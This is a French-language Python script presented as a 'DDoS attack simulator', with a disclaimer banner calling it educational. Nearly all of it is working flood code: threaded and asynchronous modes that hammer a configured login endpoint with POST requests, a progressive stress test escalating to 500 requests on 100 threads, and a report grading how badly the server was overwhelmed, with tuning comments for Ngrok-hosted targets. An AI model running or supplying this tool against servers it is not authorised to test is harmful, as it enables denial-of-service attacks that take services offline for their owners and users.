#!/usr/bin/env python3
"""
Simulation d'attaque DDoS améliorée
Avec analyse détaillée des performances et de l'impact
"""

import requests
import asyncio
import aiohttp
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from tqdm import tqdm
import statistics
from config import get_target_url, load_config

init(autoreset=True)


def banner():
    print(f"""
{Fore.RED}╔═══════════════════════════════════════════════════╗
║          💥 DDOS ATTACK SIMULATOR v2.0           ║
║              POUR TESTS PÉDAGOGIQUES              ║
║        ⚠️  NE PAS UTILISER SUR DES TIERS          ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


class DDoSAnalyzer:
    """Analyse les résultats d'une attaque DDoS"""
    
    def __init__(self):
        self.response_times = []
        self.status_codes = []
        self.start_time = None
        self.end_time = None
        self.success_count = 0
        self.timeout_count = 0
        self.error_count = 0
    
    def add_result(self, status_code, response_time, success):
        """Ajoute un résultat"""
        if success:
            self.success_count += 1
            self.status_codes.append(status_code)
            self.response_times.append(response_time)
        elif status_code == 0:
            self.timeout_count += 1
        else:
            self.error_count += 1
    
    def get_analysis(self):
        """Retourne une analyse complète"""
        total = self.success_count + self.timeout_count + self.error_count
        elapsed = self.end_time - self.start_time if self.end_time else 0
        
        analysis = {
            'total_requests': total,
            'elapsed_time': elapsed,
            'rps': total / elapsed if elapsed > 0 else 0,
            'success_count': self.success_count,
            'timeout_count': self.timeout_count,
            'error_count': self.error_count,
            'success_rate': (self.success_count / total * 100) if total > 0 else 0,
            'timeout_rate': (self.timeout_count / total * 100) if total > 0 else 0
        }
        
        if self.response_times:
            analysis['avg_response_time'] = statistics.mean(self.response_times)
            analysis['min_response_time'] = min(self.response_times)
            analysis['max_response_time'] = max(self.response_times)
            analysis['median_response_time'] = statistics.median(self.response_times)
        
        return analysis
    
    def print_analysis(self):
        """Affiche l'analyse"""
        analysis = self.get_analysis()
        
        print(f"\n{Fore.CYAN}╔═══════════════ ANALYSE DÉTAILLÉE ═══════════════╗{Style.RESET_ALL}")
        
        # Performance
        print(f"\n{Fore.WHITE}📊 PERFORMANCES:{Style.RESET_ALL}")
        print(f"  • Requêtes totales: {analysis['total_requests']}")
        print(f"  • Temps écoulé: {analysis['elapsed_time']:.2f}s")
        print(f"  • Requêtes/seconde: {Fore.YELLOW}{analysis['rps']:.2f}{Style.RESET_ALL}")
        
        # Résultats
        print(f"\n{Fore.WHITE}✓ RÉSULTATS:{Style.RESET_ALL}")
        print(f"  • Succès: {Fore.GREEN}{analysis['success_count']}{Style.RESET_ALL} ({analysis['success_rate']:.1f}%)")
        print(f"  • Timeouts: {Fore.YELLOW}{analysis['timeout_count']}{Style.RESET_ALL} ({analysis['timeout_rate']:.1f}%)")
        print(f"  • Erreurs: {Fore.RED}{analysis['error_count']}{Style.RESET_ALL}")
        
        # Temps de réponse
        if 'avg_response_time' in analysis:
            print(f"\n{Fore.WHITE}⏱️  TEMPS DE RÉPONSE:{Style.RESET_ALL}")
            print(f"  • Moyen: {analysis['avg_response_time']*1000:.0f}ms")
            print(f"  • Médian: {analysis['median_response_time']*1000:.0f}ms")
            print(f"  • Min: {analysis['min_response_time']*1000:.0f}ms")
            print(f"  • Max: {analysis['max_response_time']*1000:.0f}ms")
        
        # Impact
        print(f"\n{Fore.WHITE}💥 IMPACT SUR LE SERVEUR:{Style.RESET_ALL}")
        
        if analysis['timeout_rate'] > 50:
            print(f"  {Fore.RED}🔥 SERVEUR COMPLÈTEMENT SURCHARGÉ{Style.RESET_ALL}")
            print(f"  {Fore.RED}   → Plus de 50% de timeouts !{Style.RESET_ALL}")
        elif analysis['timeout_rate'] > 30:
            print(f"  {Fore.YELLOW}⚠️  SERVEUR FORTEMENT IMPACTÉ{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}   → 30-50% de timeouts{Style.RESET_ALL}")
        elif analysis['timeout_rate'] > 10:
            print(f"  {Fore.YELLOW}⚠️  SERVEUR LÉGÈREMENT RALENTI{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}   → 10-30% de timeouts{Style.RESET_ALL}")
        else:
            print(f"  {Fore.GREEN}✓ SERVEUR RÉSISTE BIEN{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}   → Moins de 10% de timeouts{Style.RESET_ALL}")
        
        # Recommandations
        if analysis['timeout_rate'] > 20:
            print(f"\n{Fore.CYAN}💡 RECOMMANDATIONS:{Style.RESET_ALL}")
            print(f"  • Implémenter un rate limiting")
            print(f"  • Ajouter un load balancer")
            print(f"  • Utiliser un CDN (Cloudflare)")
            print(f"  • Augmenter les ressources serveur")


def single_request(url, data=None, timeout=5):
    """Envoie une seule requête et mesure le temps"""
    start = time.time()
    try:
        if data:
            response = requests.post(url, json=data, timeout=timeout)
        else:
            response = requests.get(url, timeout=timeout)
        
        elapsed = time.time() - start
        return response.status_code, elapsed, True
        
    except requests.exceptions.Timeout:
        return 0, timeout, False
    except requests.exceptions.RequestException as e:
        return 0, 0, False


def threaded_flood(num_requests, num_threads, url, data=None):
    """Flood multi-thread avec analyse"""
    print(f"\n{Fore.CYAN}[*] Démarrage flood multi-thread")
    print(f"[*] Nombre de requêtes: {num_requests}")
    print(f"[*] Nombre de threads: {num_threads}")
    print(f"[*] URL cible: {url}{Style.RESET_ALL}\n")
    
    analyzer = DDoSAnalyzer()
    analyzer.start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        
        for _ in range(num_requests):
            future = executor.submit(single_request, url, data, 5)
            futures.append(future)
        
        for future in tqdm(as_completed(futures), total=num_requests, desc="Envoi", colour="red"):
            status, resp_time, success = future.result()
            analyzer.add_result(status, resp_time, success)
    
    analyzer.end_time = time.time()
    analyzer.print_analysis()
    
    return analyzer


async def async_request(session, url, data=None, timeout=5):
    """Requête asynchrone avec mesure de temps"""
    start = time.time()
    try:
        if data:
            async with session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=timeout)) as response:
                elapsed = time.time() - start
                return response.status, elapsed, True
        else:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as response:
                elapsed = time.time() - start
                return response.status, elapsed, True
                
    except asyncio.TimeoutError:
        return 0, timeout, False
    except Exception:
        return 0, 0, False


async def async_flood_worker(num_requests, url, data=None):
    """Worker asynchrone avec analyse"""
    results = []
    
    # Configuration pour Ngrok
    connector = aiohttp.TCPConnector(limit=100, limit_per_host=100)
    timeout = aiohttp.ClientTimeout(total=10, connect=5)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        
        for _ in range(num_requests):
            task = async_request(session, url, data, 10)
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
    return results


def async_flood(num_requests, url, data=None):
    """Flood asynchrone avec analyse"""
    print(f"\n{Fore.CYAN}[*] Démarrage flood asynchrone (HAUTE VITESSE)")
    print(f"[*] Nombre de requêtes: {num_requests}")
    print(f"[*] URL cible: {url}{Style.RESET_ALL}\n")
    
    analyzer = DDoSAnalyzer()
    analyzer.start_time = time.time()
    
    print(f"{Fore.YELLOW}[*] Envoi des requêtes...{Style.RESET_ALL}")
    results = asyncio.run(async_flood_worker(num_requests, url, data))
    
    # Analyser les résultats
    for result in results:
        if isinstance(result, tuple):
            status, resp_time, success = result
            analyzer.add_result(status, resp_time, success)
        else:
            analyzer.error_count += 1
    
    analyzer.end_time = time.time()
    analyzer.print_analysis()
    
    return analyzer


def stress_test_progressive(url, data=None):
    """Test de stress progressif"""
    print(f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════╗
║            🔥 TEST DE STRESS PROGRESSIF          ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
    
    levels = [
        (50, 10, "Léger"),
        (100, 20, "Modéré"),
        (200, 50, "Intense"),
        (500, 100, "Extrême")
    ]
    
    all_results = []
    
    for num_req, num_threads, level in levels:
        print(f"\n{Fore.YELLOW}{'═' * 60}")
        print(f"Niveau {level}: {num_req} requêtes, {num_threads} threads")
        print(f"{'═' * 60}{Style.RESET_ALL}")
        
        analyzer = threaded_flood(num_req, num_threads, url, data)
        analysis = analyzer.get_analysis()
        analysis['level'] = level
        all_results.append(analysis)
        
        time.sleep(3)  # Pause entre les niveaux
    
    # Rapport comparatif
    print(f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════╗
║              📊 RAPPORT COMPARATIF                ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
    
    print(f"\n{Fore.WHITE}{'Niveau':<12} {'Req/s':<12} {'Timeouts%':<15} {'Impact':<20}{Style.RESET_ALL}")
    print("─" * 60)
    
    for r in all_results:
        if r['timeout_rate'] > 50:
            impact = f"{Fore.RED}Critique{Style.RESET_ALL}"
        elif r['timeout_rate'] > 30:
            impact = f"{Fore.YELLOW}Élevé{Style.RESET_ALL}"
        elif r['timeout_rate'] > 10:
            impact = f"{Fore.YELLOW}Modéré{Style.RESET_ALL}"
        else:
            impact = f"{Fore.GREEN}Faible{Style.RESET_ALL}"
        
        print(f"{r['level']:<12} {r['rps']:<12.2f} {r['timeout_rate']:<15.1f} {impact}")


def main():
    banner()
    
    # Charger ou demander la configuration
    config = load_config()
    if not config:
        config = get_target_url()
    
    TARGET_URL = config['login_endpoint']
    
    print(f"\n{Fore.GREEN}[✓] Cible configurée: {TARGET_URL}{Style.RESET_ALL}")
    
    print(f"""
{Fore.WHITE}Sélectionnez le type d'attaque DDoS:
1. Flood multi-thread (recommandé pour Ngrok)
2. Flood asynchrone (très rapide)
3. Test de stress progressif
4. Quitter{Style.RESET_ALL}
""")
    
    choice = input(f"{Fore.CYAN}Votre choix (1-4): {Style.RESET_ALL}")
    
    if choice == "1":
        num = int(input(f"{Fore.WHITE}Nombre de requêtes (ex: 200): {Style.RESET_ALL}"))
        threads = int(input(f"{Fore.WHITE}Nombre de threads (ex: 50): {Style.RESET_ALL}"))
        threaded_flood(num, threads, TARGET_URL, {"username": "test", "password": "test"})
    
    elif choice == "2":
        num = int(input(f"{Fore.WHITE}Nombre de requêtes (ex: 500): {Style.RESET_ALL}"))
        async_flood(num, TARGET_URL, {"username": "test", "password": "test"})
    
    elif choice == "3":
        stress_test_progressive(TARGET_URL, {"username": "test", "password": "test"})
    
    elif choice == "4":
        print(f"{Fore.CYAN}[*] Au revoir !{Style.RESET_ALL}")
    
    else:
        print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attaque interrompue{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")